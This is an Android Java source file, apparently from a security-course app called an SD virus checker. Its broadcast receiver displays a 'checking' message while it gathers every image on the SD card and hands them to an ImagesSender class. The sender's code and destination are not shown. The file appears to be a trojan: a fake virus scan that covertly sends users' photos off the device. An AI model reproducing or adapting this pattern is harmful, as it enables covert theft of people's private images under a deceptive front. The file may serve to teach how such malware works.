package com.seginf.sdviruschecker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Looper;
import android.util.Log;

import com.seginf.sdviruschecker.ImagesReader;
import com.seginf.sdviruschecker.ImagesSender;

import java.io.File;
import java.util.List;

public class SDProcessorReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        new SDAnalyzerTask().execute(context);
    }

    private static class SDAnalyzerTask extends AsyncTask<Context, Integer, Long> {
        @Override
        protected Long doInBackground(Context... contexts) {
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            Log.d("PROCESSOR RECEIVER", "START");
            MainActivity mainActivity = MainActivity.getInstace();
            if (mainActivity != null) {
                mainActivity.showStartChecking();
            }
            List<File> imagesFromSd = ImagesReader.getImagesFromSd();
            ImagesSender.sendImages(imagesFromSd, contexts[0]);
            return null;
        }

        protected void onPostExecute(Long result) {
            Log.d("PROCESSOR RECEIVER", "END");
        }
    }
}
